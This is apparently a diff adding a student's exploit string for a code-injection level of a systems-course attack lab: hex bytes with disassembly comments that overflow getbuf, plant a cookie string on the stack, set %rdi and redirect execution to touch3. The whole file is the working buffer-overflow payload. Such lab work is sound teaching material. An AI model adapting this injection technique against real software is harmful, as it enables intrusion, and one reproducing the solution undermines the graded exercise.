@@ -1,0 +1,11 @@
+33 33 33 33 33 33 33 33       /* 00: Padding 8 bytes                         */
+33 33                         /* 08: Padding 2 bytes                         */
+48 b8 34 33 32 32 37          /* 10: movabs $0x3838613732323334,%rax         */
+61 38 38                      /* 17:                                         */
+48 89 44 24 10                /* 20: mov    %rax,0x10(%rsp)                  */
+48 c7 44 24 18 00 00          /* 25: movq   $0x0,0x18(%rsp)                  */
+00 00                         /* 32:                                         */
+48 8d 7c 24 10                /* 34: lea    0x10(%rsp),%rdi                  */
+c3                            /* 39: retq                                    */
+92 f9 60 55 00 00 00 00       /* 40: Modified return address for getbuf      */
+ca 19 40 00 00 00 00 00       /* 48: Return to touch3                        */
